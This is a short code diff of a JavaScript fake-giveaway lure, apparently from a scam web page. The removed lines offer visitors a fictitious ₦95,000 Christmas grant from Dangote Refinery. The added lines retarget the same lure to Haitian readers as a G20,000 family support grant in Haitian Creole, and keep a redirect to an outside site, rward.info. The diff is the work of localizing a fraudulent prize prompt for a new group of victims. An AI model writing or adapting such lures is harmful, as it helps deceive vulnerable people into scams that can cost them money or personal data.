@@ -1,5 +1,6 @@
-var password = 'Submit Now'
-password=prompt('Congratulations, you are eligible to receive the ₦95,000 Grant Opportunity for Christmas Celebration From Dangote Refinery, Kindly press OK to Proceed now','Submit Now');
-if (password != 'Submit Now') {
+
+var password = 'Soumèt Kounye a'
+password=prompt('Felisitasyon, ou kalifye pou resevwa Sipò Fanmi Ayisyen G20,000 pou Nouvel Ane a. Tanpri peze OK pou kontinye kounye a','Soumèt Kounye a');
+if (password != 'Soumèt Kounye a') {
 location.href='https://rward.info/Haitian-Family-Support.html';
 }
